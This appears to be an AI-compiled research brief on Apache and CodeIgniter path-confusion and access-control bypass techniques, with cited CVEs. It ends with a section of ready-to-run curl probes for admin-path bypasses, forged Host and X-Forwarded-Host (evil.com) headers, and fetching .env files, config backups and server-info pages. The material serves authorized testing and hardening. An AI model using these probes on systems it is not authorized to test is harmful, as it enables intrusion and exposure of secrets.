# Apache + CodeIgniter Path Normalization and Auth Bypass Techniques

## Advanced mod_rewrite Bypass Techniques Beyond Standard Path Traversal

### Takeaway
Orange Tsai's 2024 "Confusion Attacks" research identified three classes of semantic ambiguity in Apache httpd -- Filename Confusion, DocumentRoot Confusion, and Handler Confusion -- yielding 9 CVEs. The most exploitable technique is the `%3F` (encoded question mark) truncation in mod_rewrite backreferences (CVE-2024-38474/38475), which causes Apache to treat part of a rewritten path as a query string, effectively truncating the filesystem path and serving unintended files.

### Cited Findings
- Orange Tsai identified three types of confusion attacks within Apache httpd: Filename confusion, DocumentRoot confusion, and Handler confusion, yielding 9 disclosed vulnerabilities -- [Orange Tsai Blog](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/); [Black Hat USA 2024 Slides](https://i.blackhat.com/BH-US-24/Presentations/US24-Orange-Confusion-Attacks-Exploiting-Hidden-Semantic-Thursday.pdf)
- CVE-2024-38475: mod_rewrite substitutions that use a backreference or variable as the first segment allow attackers to map URLs to filesystem locations not intended to be directly reachable. Affected versions: 2.4.0 through 2.4.59, fixed in 2.4.60 -- [Oracle Linux CVE Record](https://linux.oracle.com/cve/CVE-2024-38475.html); [OP Innovate Analysis](https://op-c.net/blog/cve-2024-38475/)
- CVE-2024-38474: encoded question marks (`%3F`) in mod_rewrite backreferences truncate the path, because mod_rewrite treats all results as a URL and splits on `?`. This can bypass file-based access controls -- [Akamai Blog](https://www.akamai.com/blog/security-research/apache-waf-proactive-collaboration-orange-tsai-devcore)
- For any RewriteRule in per-directory context, Apache triggers an internal redirect causing double URL-decoding, where the URL is decoded twice -- [Orange Tsai Blog](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- CVE-2001-1072: Extra slashes in the request path cause RewriteRule regex to fail to match, bypassing rewrite-based access controls -- [Multiple CVE databases](https://cve.imfht.com/detail/CVE-2001-1072)
- PCRE backtracking exhaustion in mod_rewrite rules (tested on Apache 2.2.16-17) can cause rule-match failure. While documented as a DoS vector, the same mechanism could theoretically cause a security-relevant RewriteRule to silently fail to match -- [Packet Storm Advisory](https://dl.packetstormsecurity.net/1012-advisories/apacherewrite-exhaust.txt)
- An academic paper on backreference-induced ReDoS describes PCRE hitting its backtracking limit and aborting the match, which in IDS contexts causes alert failure -- [arXiv 2602.21459](https://arxiv.org/pdf/2602.21459)
- CISA added CVE-2024-38475 to its Known Exploited Vulnerabilities catalog; public exploits are available -- [OP Innovate](https://op-c.net/blog/cve-2024-38475/)

### Inferences
- The `%3F` truncation primitive is the most novel technique: if a RewriteRule maps `/(.*) -> /app/$1`, then requesting `/%3Fname=value` can cause mod_rewrite to truncate the mapped path at the decoded `?`, potentially mapping to a different file than intended.
- Double URL-decoding in per-directory RewriteRules (via internal redirect) means that `%252e%252e` may decode to `%2e%2e` on the first pass and `..` on the second, bypassing traversal filters that check only once.
- PCRE backtrack exhaustion is an underexplored bypass vector: a RewriteRule with a complex regex (e.g., negative lookaheads for blocked paths) could be defeated by crafting a URL that causes PCRE to hit its backtracking limit and return no-match, allowing the request to proceed unmodified.

### Gaps
- No source provided a concrete curl command demonstrating PCRE backtrack limit bypass of a specific security-relevant RewriteRule.
- No source documented `%25`-encoding chain exploitation beyond double encoding (i.e., triple or higher-order encoding attacks).
- Unicode normalization in Apache was not covered by any search result.

---

## Apache + PHP Path Handling Discrepancies (Parser Differentials)

### Takeaway
The critical discrepancy is that Apache and PHP-FPM can disagree on `SCRIPT_NAME`, `PATH_INFO`, and `PHP_SELF` when `ProxyPass` or `mod_rewrite` is used instead of `SetHandler`. This is compounded by Apache's `AllowEncodedSlashes` directive, which determines whether `%2F` is decoded before reaching PHP, creating a gap where the PHP router sees different path segments than Apache's access controls evaluated.

### Cited Findings
- PHP Bug #65641: When Apache forwards to PHP-FPM via ProxyPass, `SCRIPT_NAME` and `PATH_INFO` are incorrectly set. PATH_INFO showed extra path segments while SCRIPT_NAME also contained them. This broke frameworks including CodeIgniter -- [PHP Bug #65641](https://bugs.php.net/65641); [PHP Internals Discussion](https://externals.io/message/74877)
- A PHP patch addressed the issue by stripping PATH_INFO back out of SCRIPT_NAME. The recommended configuration uses `SetHandler proxy:fcgi://` inside a `FilesMatch` block instead of ProxyPass -- [PHP Pull Request #694](https://github.com/php/php-src/pull/694)
- Apache's `AllowEncodedSlashes NoDecode` accepts encoded slashes but leaves them encoded when passing to the backend. Default `Off` rejects with 404. `On` decodes them. Available since Apache 2.2.18 -- [Red Hat RFE](https://access.redhat.com/node/465853)
- A Wikimedia report confirms Apache2 decodes incoming URI paths before sending them to PHP, so the PHP router sees a literal `/` where the client sent `%2F` -- [Phabricator T235439](https://phabricator.wikimedia.org/T235439)
- A Symfony routing example shows that with `AllowEncodedSlashes NoDecode`, a route `/<id>` receiving `/foo%2Fbar/bla` results in `id = foo/bar/bla` instead of a 404 -- [TU Graz GitLab Issue](https://gitlab.tugraz.at/dbp/relay/dbp-relay-core-bundle/-/issues/17)
- Orange Tsai's Confusion Attacks: The PHP-FPM handling is where the parser differential shows up, because the backend receives the filename in an unusual format that PHP-FPM has to handle specially, enabling authentication bypass in proxy_fcgi setups -- [Orange Tsai Blog](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)

### Inferences
- The `AllowEncodedSlashes` discrepancy creates an exploitable gap: if Apache's `<Location>` or `<Directory>` ACLs match against the decoded path (seeing `/admin/secret`) but the PHP framework routes on the raw URI (seeing `/admin%2Fsecret`), a `%2F` in the right position can bypass Apache-level access control while still reaching the intended CI controller.
- PATH_INFO injection is viable when Apache uses ProxyPass to PHP-FPM: by appending extra path segments after a `.php` file (e.g., `/index.php/admin/hidden`), the `PATH_INFO` value fed to PHP may differ from what Apache's access controls evaluated.
- For CodeIgniter specifically, the framework typically uses `$_SERVER['PATH_INFO']` or `REQUEST_URI` for routing. If Apache sets these inconsistently (due to mod_rewrite or ProxyPass), the CI router may resolve to a controller that Apache's ACL did not intend to expose.

### Gaps
- No source provided a confirmed CVE for PATH_INFO injection as an access-control bypass in PHP-FPM configurations.
- The specific interaction between PHP-FPM's `cgi.fix_pathinfo` setting and Apache's path handling was not documented in the search results as an exploit technique.

---

## Dot-Segment Normalization Edge Cases

### Takeaway
The discovery that `/admin/.` returns a different (legacy) page reveals a normalization gap where Apache resolves the path differently than the application router. CVE-2026-79768 confirms that `/./` in mod_userdir with absolute UserDir creates path equivalence flaws. Multiple proxy and server products handle dot segments inconsistently, and this class of bug is actively being discovered in 2026.

### Cited Findings
- CVE-2026-79768: A path equivalence flaw (`/./`) in mod_userdir when configured with an absolute non-wildcard UserDir directive. Affects Apache 2.4.0 through 2.4.68, disclosed October 1, 2026. CVSS 5.3, confidentiality-only impact -- [Wiz Vulnerability Database](https://www.wiz.io/vulnerability-database/cve/cve-2026-79768)
- CVE-2025-0108 (PAN-OS): Nginx and Apache disagreed on the same path due to normalization differences. Authentication was set at the Nginx level but the request was re-processed by Apache with different path handling -- [Assetnote Research](https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)
- Encoded dot-segments (`%2e%2e/%2e%2e/`) can bypass normalization functions. Double-encoding (`%252e%252e`) gets past single-decode sanitization. Browsers normalize URLs before sending, so testing requires `curl --path-as-is` -- [Secure Code Warrior](https://securecodewarrior.com/article/experience-the-impact-path-traversal-vulnerability-apache)
- CVE-2026-73551 (Envoy): Dot segments carrying semicolon parameters (`;`) create path-equivalence issues in proxy components -- [OpenCVE](https://app.opencve.io/cve/CVE-2026-73551)
- A Heimdall advisory describes rule matching on the raw (non-normalized) request path while downstream components normalize dot-segments, enabling access control bypass -- referenced in search results

### Inferences
- The `/admin/.` returning a legacy page strongly suggests that Apache resolves the trailing dot-segment (normalizing `/admin/.` to `/admin/`) and serves the directory's default handler, while the CI application's auth middleware never evaluates this path because CI sees it as a different route pattern. The "legacy page" is likely the raw directory index or an older `index.html` file that predates the CI application.
- Other dot-segment variants to test based on these findings:
  - `/admin/./` -- trailing dot-segment with slash
  - `/admin/..;/admin/` -- semicolon parameter with parent traversal (Tomcat-style, but worth testing)
  - `/admin/%2e` -- encoded dot
  - `/admin/%2e/` -- encoded dot with slash
  - `/admin/.%00` -- null byte after dot (legacy PHP < 5.3.4)
  - `/admin/././` -- multiple dot-segments
  - `/admin/subdir/../` -- parent traversal that resolves back to admin
  - `/admin;/` -- semicolon before slash (works on some Java servers, unlikely on Apache but worth testing)
  - `/admin%20/` -- trailing space
  - `/admin/` vs `/admin` -- trailing slash difference (Apache may serve DirectoryIndex vs redirect)

### Gaps
- No source confirmed exactly which Apache module or directive causes `/admin/.` to serve different content than `/admin/` beyond the mod_userdir case in CVE-2026-79768.
- No research covered null-byte dot-segment combinations on modern PHP (5.4+).

---

## Apache Configuration Disclosure Techniques

### Takeaway
Apache's `mod_status` (`/server-status`) and `mod_info` (`/server-info`) are the primary configuration disclosure endpoints. Both can be enabled from `.htaccess` files once the module is loaded, and they expose detailed server internals including request URIs, client IPs, virtual host configurations, and all loaded directives.

### Cited Findings
- mod_info (`/server-info`): Once loaded, its handler works in per-directory files like `.htaccess`. It can expose system paths and sensitive configuration details. The Apache manual recommends restricting access with `mod_authz_host` -- [Apache mod_info Documentation](https://apache.googlesource.com/httpd/+/trunk/docs/manual/mod/mod_info.xml)
- mod_status (`/server-status`): A public status page shows every active worker slot including client IP, vhost, and the full request URI with query strings -- [Netdata Guide](https://www.netdata.cloud/guides/apache-httpd/apache-httpd-server-status-exposed/)
- `/server-info?config` shows all configuration directives. `/server-status?auto` returns machine-readable status -- [Apache Documentation](https://apache.googlesource.com/httpd/+/2.2.x/docs/manual/mod/mod_info.xml)
- CVE-2014-0226: Heap buffer overflow in mod_status on threaded MPMs (worker, event), reachable when the status page is publicly accessible, fixed in 2.4.10 -- [G5 Cybersecurity Guide](https://guides.g5cybersecurity.com/?p=32091)
- CVE-2012-3499: XSS in mod_status output, fixed in 2.4.4 -- [G5 Cybersecurity Guide](https://guides.g5cybersecurity.com/?p=32093)

### Inferences
- For the reconnaissance phase, probing these endpoints (and variants like `/server-status?auto`, `/server-info?config`, `/server-info?server`, `/server-info?list`) can reveal the exact RewriteRules in place, the DocumentRoot, loaded modules, and virtual host configurations -- all of which inform further bypass attempts.
- If mod_info is accessible, it directly reveals the `.htaccess` contents and the rewrite rules being used for access control, eliminating the need to guess at the protection mechanism.

### Gaps
- No source documented techniques for disclosing `.htaccess` content when mod_info is not loaded (e.g., via backup file discovery or misconfigured Alias directives).

---

## HTTP Verb Tampering for Access Control Bypass

### Takeaway
When Apache `.htaccess` uses `<Limit GET POST>` instead of `<LimitExcept GET POST>`, any HTTP method not listed (HEAD, OPTIONS, PATCH, PUT, DELETE, TRACE, or arbitrary custom verbs) bypasses the access restriction entirely. This is a well-documented and commonly exploitable misconfiguration.

### Cited Findings
- Apache with `.htaccess` is vulnerable if HTTP verbs are specified using the `LIMIT` keyword. The fix is to use `LimitExcept` instead of `Limit` -- [Acunetix](https://acunetix.com/vulnerabilities/web/http-verb-tampering)
- Access rules that list only certain methods (GET and POST) can leave other methods unchecked. This is an incomplete access control configuration that uses allowlists of HTTP methods rather than denylists -- [Invicti](https://www.invicti.com/learn/host-header-attacks)
- HEAD can slip past GET-only rules because the server may short-circuit auth checks on HEAD requests, since HEAD is semantically "GET without body" -- [InfoSec Institute](https://infosecinstitute.com/resources/application-security/http-verb-tempering-bypassing-web-authentication-and-authorization/)
- TRACE echoes back the full request to the client, enabling Cross-Site Tracing (XST) attacks -- [InfoSec Institute](https://infosecinstitute.com/resources/application-security/http-verb-tempering-bypassing-web-authentication-and-authorization/)

### Inferences
- For CodeIgniter specifically, the framework's own routing typically handles GET and POST. But if Apache-level `.htaccess` ACLs use `<Limit>`, sending a request with `HEAD`, `OPTIONS`, `PATCH`, or even an invented verb like `FOOBAR` may bypass Apache's auth while CI still routes the request to the controller. Example test:
  ```
  curl -X OPTIONS https://target/admin/
  curl -X PATCH https://target/admin/
  curl -X FOOBAR https://target/admin/
  curl -I https://target/admin/   # HEAD request
  ```
- CI's `$this->request->getMethod()` returns the actual HTTP method, so if the controller does not explicitly check for allowed methods, a HEAD or OPTIONS request may execute the controller logic and return data.

### Gaps
- No source covered PHP or CodeIgniter-specific method handling beyond the Apache layer.

---

## Host Header Attacks Against Apache + CodeIgniter

### Takeaway
Host header injection can cause Apache to route requests to the wrong virtual host, potentially exposing internal or legacy applications. The `X-Forwarded-Host` header can override the Host header in applications that trust proxy headers, which CodeIgniter does by default when proxy headers are configured.

### Cited Findings
- Web servers dispatch requests to virtual hosts based on the Host header value. An attacker supplying invalid input can cause the server to dispatch to the first virtual host on the list (the default vhost), enabling virtual host confusion -- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- If systems differ in how they interpret multiple Host headers, a Host header injection vulnerability results. Example: server routes on first Host header, application trusts the last -- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- `X-Forwarded-Host` can effectively override the Host header when the application uses it without validation -- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
- Impact includes redirect to attacker-controlled domain, web cache poisoning, manipulation of password reset URLs, and access to virtual hosts not intended to be externally accessible -- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)

### Inferences
- If the Apache server has multiple vhosts (e.g., a production CI app on `app.example.com` and a legacy/staging app on the default vhost), sending a request with a forged Host header could route to the default vhost, which may lack access controls. Example:
  ```
  curl -H "Host: nonexistent.example.com" https://target-ip/admin/
  curl -H "Host: localhost" https://target-ip/admin/
  curl -H "Host: 127.0.0.1" https://target-ip/admin/
  ```
- Duplicate Host headers can exploit parsing differences:
  ```
  curl -H "Host: legitimate.com" -H "Host: attacker.com" https://target/
  ```
- `X-Forwarded-Host` injection affects CI's `base_url()` and redirect functions if the app trusts proxy headers.

### Gaps
- No source documented Apache-specific vhost-confusion exploitation techniques in detail.
- The interaction between Apache's `UseCanonicalName` directive and Host header attacks was not covered.

---

## Apache Version-Specific Vulnerabilities for Path Confusion (2024-2026)

### Takeaway
The 2024-2026 period saw a wave of path confusion CVEs stemming from Orange Tsai's Confusion Attacks research. The most significant are CVE-2024-38474/38475 (mod_rewrite confusion), CVE-2025-0108 (Nginx/Apache path confusion in PAN-OS), and CVE-2026-79768 (dot-segment mod_userdir bypass). Apache 2.4.69 (October 2026) addresses 20 vulnerabilities including new handler confusion and path-equivalence issues.

### Cited Findings
- CVE-2024-38474: Encoded question marks in mod_rewrite backreferences. Affects 2.4.0-2.4.59, fixed in 2.4.60 -- [Apache Security Advisories](https://httpd.apache.org/security/vulnerabilities_24.html)
- CVE-2024-38475: Improper escaping of output in mod_rewrite, allowing filesystem mapping to unintended locations. Affects 2.4.0-2.4.59, fixed in 2.4.60 -- [Oracle Linux CVE Record](https://linux.oracle.com/cve/CVE-2024-38475.html)
- CVE-2024-38476: Exploitable/malicious backend application output can trigger internal redirects to unintended handlers via informational response headers -- [Apache Security Advisories](https://httpd.apache.org/security/vulnerabilities_24.html)
- CVE-2025-0108: Nginx/Apache path confusion enabling authentication bypass in PAN-OS. Nginx and Apache handled the same URL path differently, allowing unauthenticated access -- [Assetnote Research](https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os); [SLCyber Analysis](https://slcyber.io/research-center/nginx-apache-path-confusion-to-auth-bypass-in-pan-os-cve-2025-0108/)
- CVE-2026-79768: Path equivalence flaw (`/./`) in mod_userdir with absolute UserDir. Affects 2.4.0-2.4.68, fixed in 2.4.69 -- [Wiz Vulnerability Database](https://www.wiz.io/vulnerability-database/cve/cve-2026-79768)
- CVE-2026-42356: CGI handler confusion after internal redirects. Affects 2.4.60-2.4.68, fixed in 2.4.69 -- [Apache Security Advisories](https://httpd.apache.org/security/vulnerabilities_24.html)
- CVE-2026-56154: mod_rewrite use-after-free. Fixed in 2.4.69 -- [Apache Security Advisories](https://httpd.apache.org/security/vulnerabilities_24.html)
- CVE-2026-63718: Response smuggling in mod_proxy_uwsgi via crafted Transfer-Encoding. CVSS 7.5 -- [OpenCVE](https://app.opencve.io/cve/?product=http_server&vendor=apache)
- Apache 2.4.69, released October 1 2026, addresses 20 vulnerabilities -- [The Cybersec Guru](https://thecybersecguru.com/news/apache-http-server-2-4-69-vulnerabilities/)

### Inferences
- The Confusion Attacks research class (2024) is the most relevant to the user's scenario. The same mod_rewrite primitives that power CVE-2024-38474/38475 are likely present in any Apache + CI setup that uses `.htaccess` RewriteRules.
- CVE-2026-42356 (handler confusion after internal redirects) is a direct descendant of the same research line and affects Apache 2.4.60-2.4.68 -- meaning even systems that patched for the 2024 CVEs may still be vulnerable.
- The ongoing discovery of path-equivalence bugs (CVE-2026-79768) confirms that dot-segment normalization edge cases remain an active attack surface.

### Gaps
- Detailed exploitation techniques for CVE-2026-42356 and CVE-2026-79768 were not available in search results (likely too recent for detailed writeups).

---

## Hidden Endpoint and Legacy Controller Discovery

### Takeaway
For CodeIgniter applications, discovery should target the framework's routing conventions (controller/method URL segments), common admin paths, backup/editor files that disclose source code, and Apache information endpoints. The most reliable technique is wordlist-based fuzzing with CI-specific patterns combined with backup file probing.

### Cited Findings
- URL fuzzers discover hidden content by testing file and directory names from wordlists. They find backup files, admin panels, configuration files, and other resources not linked from the main application -- [Pentest-Tools Documentation](https://pentest-tools.com/docs/tools/url-fuzzer.md)
- SecLists contains common.txt and an api_wordlist of API function-name verbs and nouns for Burp Intruder cluster-bomb attacks -- [SecLists GitHub](https://gitea.ishift.duckdns.org/idan/SecLists/commit/7f083ceb079d4f9bf89d76557ba5388b99101e93)
- Backup file extensions that commonly disclose source code: `.bak`, `.old`, `.backup`, `~`, `.swp`, `.tmp`, `.orig`, `.copy`, plus compressed archives like `backup.zip` and `source.tar.gz` -- [Invicti](https://www.invicti.com/web-application-vulnerabilities/possible-backup-source-code-detected)
- A backup or temporary copy without the `.php` extension gets served as plain text instead of being executed, exposing source code -- [Invicti](https://www.invicti.com/web-application-vulnerabilities/configuration-file-source-code-disclosure)
- Active scanning for `.php.bak`, `.php.old`, `.php.swp` is ongoing as of 2026 -- [James Brine Scanner Logs](https://jamesbrine.com.au/php/asp/jsp-source-backup-file-grab-for-2026-08-06/)

### Inferences
- CodeIgniter-specific wordlist patterns to test (based on CI conventions, not sourced from search results):
  - `/welcome`, `/home`, `/dashboard` -- common default controllers
  - `/api`, `/api/v1`, `/api/v2` -- API versioning
  - `/admin`, `/admin/login`, `/admin/dashboard`, `/admin/users`
  - `/auth`, `/login`, `/logout`, `/register`, `/forgot_password`
  - `/migrate`, `/migration`, `/install`, `/setup` -- setup/migration controllers
  - `/test`, `/debug`, `/phpinfo`, `/info` -- development leftovers
  - `/cron`, `/task`, `/queue`, `/worker` -- background task endpoints
  - `/upload`, `/file`, `/download`, `/export`, `/import`
  - `/config`, `/settings`, `/system`
  - `/user/profile`, `/user/edit`, `/user/delete`
- Backup file patterns for CI files:
  ```
  /application/config/database.php.bak
  /application/config/config.php~
  /.env
  /.env.backup
  /application/config/database.php.swp
  /.application/config/database.php.orig
  /composer.json (reveals dependencies)
  /composer.lock
  ```
- Vim swap files follow the pattern `.filename.php.swp` (note the leading dot) and are commonly missed by scanners that don't account for the dot prefix.

### Gaps
- No search result provided a CodeIgniter-specific wordlist or documented default CI controller names from the framework documentation.
- No source documented CI4's `spark routes` command output format as a discovery aid.

---

## HTTP/2 and Protocol Downgrade Techniques

### Takeaway
HTTP/2 downgrade (h2c smuggling) is a documented attack class, but no search results demonstrated it specifically against Apache httpd's path handling. The most relevant finding is CVE-2026-58150, a request smuggling flaw in Apache Traffic Server (not httpd) via Transfer-Encoding in HTTP/2 requests.

### Cited Findings
- An attacker can break HTTP/2 negotiation so the server falls back to HTTP/1.1, then send crafted headers and chunked bodies to attempt smuggling or cache bypass -- [Elastic Detection Rule](https://www.elastic.co/guide/en/security/8.19/potential-http-downgrade-attack.html)
- Mitigations include blocking `Upgrade: h2c` attempts, rejecting requests with both Content-Length and Transfer-Encoding, and requiring TLS with ALPN `h2` -- [Elastic Detection Rule](https://www.elastic.co/guide/en/security/8.19/potential-http-downgrade-attack.html)
- CVE-2026-58150: Apache Traffic Server does not reject Transfer-Encoding in HTTP/2 requests, allowing downgrade request smuggling. Affects ATS 8.0.0-8.1.9, 9.0.0-9.2.14, 10.0.0-10.1.3 -- [Red Hat CVE Record](https://access.redhat.com/security/cve/CVE-2026-58150)

### Inferences
- For Apache httpd specifically, the h2c upgrade path is less commonly exploited because most deployments use TLS. However, if a reverse proxy (Nginx, HAProxy) sits in front of Apache, the proxy-to-Apache connection may use HTTP/1.1 internally, making traditional request smuggling (CL/TE or TE/CL desync) relevant for path confusion.
- The PAN-OS case (CVE-2025-0108) demonstrates that reverse-proxy + Apache path confusion is the more productive attack surface compared to HTTP/2 downgrade.

### Gaps
- No source documented HTTP/2-specific path handling differences in Apache httpd.
- h2c smuggling against Apache httpd specifically was not covered by any search result.

---

## Practical Exploitation Patterns and Curl Commands

### Takeaway
Based on all findings above, the following are concrete test patterns that go beyond the 72 standard path traversal variants, organized by technique class. All testing should only be performed against systems you own or are authorized to test.

### Cited Findings
(Compiled from all sections above with appropriate source citations inline.)

### Test Patterns

**1. mod_rewrite %3F Truncation (CVE-2024-38474)**
```bash
# If RewriteRule maps /(.*) to /app/$1, the %3F truncates the path
curl --path-as-is 'https://target/admin%3F.php'
curl --path-as-is 'https://target/admin%3Fname=value'
curl --path-as-is 'https://target/%3F/admin'
```

**2. Double URL-Decoding via Internal Redirect**
```bash
# Per-directory RewriteRule triggers internal redirect = double decode
curl --path-as-is 'https://target/%252e%252e/admin'
curl --path-as-is 'https://target/public/%252e%252e/admin/index.php'
curl --path-as-is 'https://target/%252fadmin'
```

**3. Dot-Segment Normalization Variants**
```bash
# Based on the /admin/. finding and CVE-2026-79768
curl --path-as-is 'https://target/admin/.'
curl --path-as-is 'https://target/admin/./'
curl --path-as-is 'https://target/admin/./.'
curl --path-as-is 'https://target/admin/%2e'
curl --path-as-is 'https://target/admin/%2e/'
curl --path-as-is 'https://target/admin/foo/../'
curl --path-as-is 'https://target/admin/foo/..;/'
curl --path-as-is 'https://target/./admin/'
curl --path-as-is 'https://target/admin/./config'
```

**4. AllowEncodedSlashes Exploitation**
```bash
# %2F may not be decoded, creating path segment confusion
curl --path-as-is 'https://target/admin%2Fhidden'
curl --path-as-is 'https://target/public%2F..%2Fadmin'
curl --path-as-is 'https://target/index.php%2Fadmin%2Fdashboard'
```

**5. PATH_INFO Injection**
```bash
# Extra path after .php file goes to PATH_INFO
curl 'https://target/index.php/admin/dashboard'
curl 'https://target/index.php/admin/users/list'
curl 'https://target/known-public.php/admin/secret'
```

**6. HTTP Verb Tampering**
```bash
curl -X OPTIONS 'https://target/admin/'
curl -X PATCH 'https://target/admin/'
curl -X PUT 'https://target/admin/'
curl -I 'https://target/admin/'  # HEAD
curl -X TRACE 'https://target/admin/'
curl -X FOOBAR 'https://target/admin/'
curl -X PROPFIND 'https://target/admin/'
```

**7. Host Header Manipulation**
```bash
curl -H "Host: localhost" 'https://target-ip/admin/'
curl -H "Host: 127.0.0.1" 'https://target-ip/admin/'
curl -H "Host: admin.internal" 'https://target-ip/admin/'
curl -H "X-Forwarded-Host: evil.com" 'https://target/admin/'
curl -H "Host: a" -H "Host: target.com" 'https://target-ip/admin/'
```

**8. Apache Info Disclosure**
```bash
curl 'https://target/server-status'
curl 'https://target/server-status?auto'
curl 'https://target/server-info'
curl 'https://target/server-info?config'
curl 'https://target/server-info?server'
curl 'https://target/server-info?list'
```

**9. Backup/Source Code Disclosure**
```bash
curl 'https://target/index.php.bak'
curl 'https://target/index.php~'
curl 'https://target/index.php.old'
curl 'https://target/index.php.orig'
curl 'https://target/index.php.swp'
curl 'https://target/.index.php.swp'  # Vim swap pattern
curl 'https://target/application/config/database.php.bak'
curl 'https://target/.env'
curl 'https://target/.env.backup'
curl 'https://target/composer.json'
curl 'https://target/web.config'
curl 'https://target/.htaccess.bak'
```

**10. Trailing/Special Character Variants**
```bash
curl --path-as-is 'https://target/admin%20/'   # trailing space
curl --path-as-is 'https://target/admin%09/'   # trailing tab
curl --path-as-is 'https://target/admin%00'    # null byte (legacy)
curl --path-as-is 'https://target/admin\/'     # backslash
curl --path-as-is 'https://target/admin;/'     # semicolon
curl --path-as-is 'https://target/admin#frag'  # fragment
curl --path-as-is 'https://target/ADMIN/'      # case variation
curl --path-as-is 'https://target/Admin/'      # mixed case
```

### Gaps
- No source provided a complete tested matrix of which Apache version + module combination each technique works against.
- The interaction between mod_security/WAF rules and these bypass patterns was not researched.
